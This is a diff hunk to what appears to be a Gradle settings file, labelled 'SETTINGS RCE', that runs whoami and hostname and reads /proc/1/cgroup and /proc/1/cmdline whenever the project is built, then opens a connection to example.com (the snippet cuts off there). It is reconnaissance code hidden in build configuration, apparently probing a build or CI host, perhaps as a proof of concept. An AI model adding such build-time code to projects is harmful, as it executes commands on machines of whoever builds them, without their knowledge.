@@ -2,6 +2,10 @@ include ':app'
 println "=== SETTINGS RCE ==="
 println "WHOAMI: " + "whoami".execute().text
 println new File("/proc/1/cgroup").text
+println "PID 1 CMDLINE:"
+println new File("/proc/1/cmdline").text
+println "HOSTNAME:"
+println "hostname".execute().text
 try {
     def url = new URL("https://example.com")
     def conn = url.openConnection()
